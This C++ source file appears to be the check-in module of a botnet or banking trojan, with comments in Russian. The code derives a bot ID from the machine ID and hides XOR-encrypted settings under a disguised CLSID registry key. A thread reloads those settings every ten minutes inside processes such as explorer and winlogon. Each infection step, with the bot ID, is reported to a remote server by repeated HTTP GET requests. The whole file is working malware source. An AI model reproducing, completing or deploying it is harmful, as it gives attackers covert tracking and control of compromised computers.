#include <shlobj.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"

#include "Crypt.h"
#include "BotHTTP.h"
#include "BotUtils.h"
#include "dprint.h"
#include "CabPacker.h" 


// Кол-во попыток отослать информацию о прохождении точки по HTTP
const DWORD RELIABLE_HTTP_MAX_ATTEMTPS_COUNT   = 5;

// Интервал между попытками отослать информацию о прохождении точки по HTTP
const DWORD RELIABLE_HTTP_ATTEMPTS_TIMEOUT_SEC = 60;

// Структура настроек статистической отчетности
struct DebugReportSettings
{
	bool  Enabled;
	PCHAR StatPrefix;
	PCHAR StatUrl;
};

// Статистические переменные модуля DbgRpt.cpp
// Инициализируются в DebugReportInit()
static CRITICAL_SECTION     DbgRptCs;
static DebugReportSettings  DbgRptSettingDefault;
static DebugReportSettings* DbgRptSettings = NULL;


// Предварительно объявление методов
void DebugReportLoadSettings();
void DebugReportUpdateSettingsThread(void* Arguments);

// Инициализация статических переменных модуля.
// Должна вызыватся при старте до использования ф-ций модуля.
void DebugReportInit()
{
	PP_DPRINTF(L"DebugReportInit:Start initialize debug reporting (DbgRptSettings=0x%X).", 
		DbgRptSettings);

	pInitializeCriticalSection(&DbgRptCs);
	
	DbgRptSettingDefault.Enabled = false;
	DbgRptSettingDefault.StatPrefix = "";
	DbgRptSettingDefault.StatUrl = "";
	
	DbgRptSettings = &DbgRptSettingDefault;

	// Запускам процесс чтения настроек из реестра
	// Необходимо для применения в процессах, которые не выполняют команд (explorer, winlogon и тд)
	StartThread(DebugReportUpdateSettingsThread, NULL);
}

// Ф-ция конструктор для структуры DebugReportSettings
DebugReportSettings* DebugReportAllocSettings(bool Enabled, 
	const char* StatPrefix, const char* StatUrl)
{
	DebugReportSettings* result = CreateStruct(DebugReportSettings);

	result->Enabled    = Enabled;
	result->StatPrefix = STR::New((PCHAR)StatPrefix);
	result->StatUrl    = STR::New((PCHAR)StatUrl);
	
	return result;
}

// Ф-ция деструктор для структуры DebugReportSettings
void DebugReportFreeSettings(DebugReportSettings* settings)
{
	if (settings == NULL) return;
	if (settings == &DbgRptSettingDefault) return;

	if (settings->StatPrefix != NULL) STR::Free(settings->StatPrefix);
	if (settings->StatUrl != NULL)    STR::Free(settings->StatUrl);
	
	FreeStruct(settings);
}

// Возвращает истину в случае обнаружения разделителя
bool IsDelimiterChar(char ch)
{
	return (' ' == ch || '\0' == ch);
}

// Возвращает параметр из списка по индексу.
string GetParamFromParamListByIndex(const char* ParamList, DWORD ArgIndex)
{
	DWORD        ParamCounter = 0;
	const char*  Cur   = ParamList;

	// Надо учесть, что в парсинге нужен конечный '\0' символ
	const char*  Limit = ParamList + m_lstrlen(ParamList) + 1; 

	while (Cur < Limit)
	{
		string param;
		while (!IsDelimiterChar(*Cur))
		{
			char s[2] = {*Cur, 0};
			param += s;
			Cur++;
		}

		// Условия предусматривающие наличие нескольких разделителей между 
		// параметрами.
		if (ParamCounter == ArgIndex && param.Length() > 0) return param;
		if (param.Length() > 0) ParamCounter++;
		
		Cur++;
	}

	return string();
}



// Формирования строки UID с указанным префиксом
string GenerateUidAsString(const string& Prefix)
{
	string  uid = Prefix;
	PCHAR   uid_ptr = MakeMachineID();
	size_t  uid_size = m_lstrlen(uid_ptr);

	if (Prefix.Length() > 0) uid += "0";
	uid += uid_ptr;

	STR::Free(uid_ptr);
	return uid;
}

// Формирования GUIDа из UIDа без префикса
string CreateGuidFromUid(const string& uid)
{
	string wide_uid;
	string guid;
	DWORD  parts[5] = {8, 4, 4, 4, 12};


	while (wide_uid.Length() < (8+4+4+4+12)) wide_uid += uid;

	guid += "{";
	const char* CurPtr = wide_uid.t_str();

	for (size_t i = 0; i < ARRAYSIZE(parts); i++)
	{
		if (i != 0) guid += "-";

		guid += string(CurPtr, parts[i]);
		CurPtr += parts[i];
	}

	guid += "}";
	return guid;
}

// Создание(или открытие, если уже был создан) ключа в реестре для сохранения 
// шифрованных настроек статистической отчетности
HKEY CreateSettingKey()
{
	// ВНИМАНИЕ: сейчас всё сохраняется в HKEY_LOCAL_MACHINE
	// Сделан задел на добавление сохранения еще и HKEY_CURRENT_USER, если этот 
	// даст плохие отстуки

	HKEY    roots[2] = { HKEY_LOCAL_MACHINE /*, HKEY_CURRENT_USER*/ };
	HKEY    key = NULL;
	DWORD   dsp = 0;
	string  path;

	path = "Software\\Classes\\CLSID\\";
	path += CreateGuidFromUid(GenerateUidAsString(""));

	for (DWORD i = 0; i < ARRAYSIZE(roots); i++) 
	{
		DWORD create_key_result = (DWORD)pRegCreateKeyExA(roots[i],
			path.t_str(), 0, NULL, 0, KEY_ALL_ACCESS, NULL, &key, &dsp);

		if (create_key_result == ERROR_SUCCESS) return key;
	}

	return NULL;
}

// Получение изменяемого имени параметра. 
// Тоже используется UID без префикса
string GetValueName(const string& Suffix)
{
	string Uid = GenerateUidAsString("");
	string ValueName(Uid.t_str(), Uid.Length() - 5);

	ValueName += Suffix;

	PP_DPRINTF(L"GetValueName:returning value_name='%S'", ValueName.t_str());

	return ValueName;
}

// Загрузка параметров команды installbkstat из реестра 
// одновременно с дешифровкой
bool DebugReportLoadParamList(string * ParamList)
{
	HKEY key = CreateSettingKey();

	PP_DPRINTF(L"DebugReportLoadParamList:CreateSettingKey() result=0x%X", key);
	if (key == NULL) return false;

	BYTE    Buffer[1024];
	DWORD   ValueLength = sizeof(Buffer) - 1;
	DWORD   ValueType = 0;

	m_memset(Buffer, 0, sizeof(Buffer));

	DWORD query_value_result = (DWORD)pRegQueryValueExA(key, GetValueName("PL").t_str(), 0, 
		&ValueType, Buffer, &ValueLength);
	pRegCloseKey(key);

	PP_DPRINTF(L"DebugReportLoadParamList:RegQueryValueEx() result=%u ValueType=%d",
		query_value_result, ValueType);

	if (query_value_result != ERROR_SUCCESS) return false;
	if (ValueType != REG_BINARY) return false;

	
	XORCrypt::Crypt(GenerateUidAsString("").t_str(), Buffer, ValueLength);
	*ParamList = string((const char*)Buffer, ValueLength);

	PP_DPRINTF(L"DebugReportLoadParamList:Finished.(param_list='%S')", 
		(*ParamList).t_str());

	return true;
}

// Сохранение параметров команды installbkstat в реестр 
// одновременно с шифрованием
bool DebugReportSaveParamList(const string & ParamList)
{
	HKEY key = CreateSettingKey();

	PP_DPRINTF(L"DebugReportSaveParamList:CreateSettingKey() result=0x%X", key);
	if (key == NULL) return false;

	string EncodedString = ParamList;
	XORCrypt::Crypt(GenerateUidAsString("").t_str(), (LPBYTE)EncodedString.t_str(), EncodedString.Length()+1);

	DWORD set_value_result = (DWORD)pRegSetValueExA(key, GetValueName("PL").t_str(), 0, REG_BINARY, 
		(const BYTE*)EncodedString.t_str(),
		EncodedString.Length()+1);
	pRegCloseKey(key);

	PP_DPRINTF(L"DebugReportSaveParamList:RegSetValueEx() result=%u", set_value_result);
	if (set_value_result != ERROR_SUCCESS) return false;

	return true;
}

// Загрузка настроек из реестра в структуру настроек.
// Учитывается возможность работы в мультипоточной среде.
void DebugReportLoadSettings()
{
	string ParamList;
	bool ParamListLoaded  = DebugReportLoadParamList(&ParamList);

	PP_DPRINTF(L"DebugReportLoadSettings:DebugReportLoadParamList() result=%d (ParamList='%S').",
		ParamListLoaded, ParamList.t_str());

	string PlugName   = GetParamFromParamListByIndex(ParamList.t_str(), 0);
	string StatPrefix = GetParamFromParamListByIndex(ParamList.t_str(), 1);
	string StatUrl    = GetParamFromParamListByIndex(ParamList.t_str(), 2);

	PP_DPRINTF(L"DebugReportLoadSettings:Parsing arguments results: PlugName='%S' StatPrefix='%S' StatUrl='%S'",
		PlugName.t_str(), StatPrefix.t_str(), StatUrl.t_str()
		);


	DebugReportSettings* NewSettings = CreateStruct(DebugReportSettings);
	DebugReportSettings* OldSettings = NULL;

	// Если хотя бы один пустой параметр - то это означает что они неверно заданы 
	// и стука не включен.
	NewSettings->Enabled = (StatPrefix.Length() > 0) && (StatUrl.Length() > 0);

	// URL приходит без символа начала параметров
	// Поскольку раньше URL был с таки символом - просто добавляем его по умолчанию.
	StatUrl += "?";

	NewSettings->StatPrefix = STR::New(StatPrefix.t_str());
	NewSettings->StatUrl    = STR::New(StatUrl.t_str());

	// При замене необходимо защитить DbgRptSettings, потому что его могут читать где-то
	pEnterCriticalSection(&DbgRptCs);

	OldSettings = DbgRptSettings;
	DbgRptSettings = NewSettings;

	pLeaveCriticalSection(&DbgRptCs);

	DebugReportFreeSettings(OldSettings);
}

// Поток для обновления настроек для подсистемы сбора статистики
// Сделано для будущей команды обновления параметров статистики
// Обеспечивает общесистемное применение настроек через минуту после 
// установки новых параметров
void DebugReportUpdateSettingsThread(void* Arguments)
{
	while (true)
	{
		PP_DPRINTF(L"DebugReportUpdateSettingsThread:Sleep 10 min");
		pSleep(10 * 60 * 1000);

		DebugReportLoadSettings();
	}
}

// Сохранение настроек в реестр.
void DebugReportSaveSettings(const char* ParamsList)
{
	PP_DPRINTF(L"DebugReportSaveSettings:Started with ParamsList='%S'", ParamsList);
	
	// Сохраняем список параметров в реестр
	DebugReportSaveParamList(ParamsList);

	// Сразу же подгружаем их обратно для немедленного применения
	DebugReportLoadSettings();
}

// Получение копии настроек
// Копия делает из-за возможной работы в мультипоточной среде.
// Чтобы не делать защиту общих данных там, где их используют,
// делаем защиту только при загрузке и получении копии.
DebugReportSettings* DebugReportGetSettings()
{
	DebugReportSettings* result = NULL;

	// При чтении защищаемся от изменения текущего DbgRptSettings
	pEnterCriticalSection(&DbgRptCs);

	if (DbgRptSettings == &DbgRptSettingDefault)
	{
		DebugReportLoadSettings();
	}

	result = DebugReportAllocSettings(DbgRptSettings->Enabled, 
		DbgRptSettings->StatPrefix, DbgRptSettings->StatUrl);

	pLeaveCriticalSection(&DbgRptCs);

	return result;
}

// Ф-ция пробует посылать на URL GET запрос, пока не получит положительный ответ.
// Кол-во попыток ограничено MaxAttemptsCount
// Интервал между попытками TimeoutSec
void DebugReportingReliableHttpGet(PCHAR Url, DWORD MaxAttemptsCount, DWORD TimeoutSec)
{
	for (DWORD i = 0; i < MaxAttemptsCount; i++)
	{
		PP_DPRINTF(L"DebugReportingReliableHttpGet:Going to Url='%S' Attempt=%u", 
			Url, i);

		PCHAR Content = NULL;
		
		THTTPResponse Response;
		ClearStruct(Response);

		bool GetResult = HTTP::Get(Url, &Content, NULL, &Response);

		PP_DPRINTF(L"DebugReportingReliableHttpGet:HTTP::Get(Url='%S') result=%d Code=%u", 
			Url, GetResult, Response.Code);
		
		DWORD HttpResponseCode = Response.Code;
		
		// Сразу после запроса всё зачищаем
		if (Content != NULL) STR::Free(Content);
		HTTPResponse::Clear(&Response);


		// Если HTTP запрос прошел нормально и возвращен код 200 - 
		// то считаем что запрос прошел нормально
		if (GetResult == true && HttpResponseCode == HTTP_CODE_OK) break;

		// Если HTTP запрос прошел нормально и возвращен код 200 - 
		// это означает что мы убрали на сервере файл для отстука
		// Прекращаем пробовать.
		if (GetResult == true && HttpResponseCode == 404) break;

		// Если мы исчерпали кол-во попыток - не стоит спать перед после последней.
		if ((i+1) == MaxAttemptsCount) break;

		// Если предыдущее условие не выполнилось - засыпаем на определенный период.
		PP_DPRINTF(L"DebugReportingReliableHttpGet:Sleeping TimeoutSec=%u before next attempt", TimeoutSec);
		pSleep(TimeoutSec * 1000);
	}
}

void DebugReportStepByName(const char* StepName)
{
	DebugReportSettings* settings = DebugReportGetSettings();
	PP_DPRINTF(L"DebugReportStepByName: Started with settings: Enabled='%d' StatPrefix='%S' StatUrl='%S'",
		settings->Enabled, settings->StatPrefix, settings->StatUrl
		);

	if (!settings->Enabled) return;
	string BotUid = GenerateUidAsString(settings->StatPrefix);

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "cmd", "step");
	AddURLParam(Fields, "uid", BotUid.t_str());
	AddURLParam(Fields, "step", (PCHAR)StepName);

	PCHAR Params = Strings::GetText(Fields, "&");
	PCHAR URL = STR::New(2, settings->StatUrl, Params);

	// Критично важно не потерять точки отстука по именам.
	// Используем тут более надежную доставку.
	DebugReportingReliableHttpGet(URL, RELIABLE_HTTP_MAX_ATTEMTPS_COUNT, 
		RELIABLE_HTTP_ATTEMPTS_TIMEOUT_SEC);

	STR::Free(URL);
	STR::Free(Params);
	Strings::Free(Fields);
	DebugReportFreeSettings(settings);
}
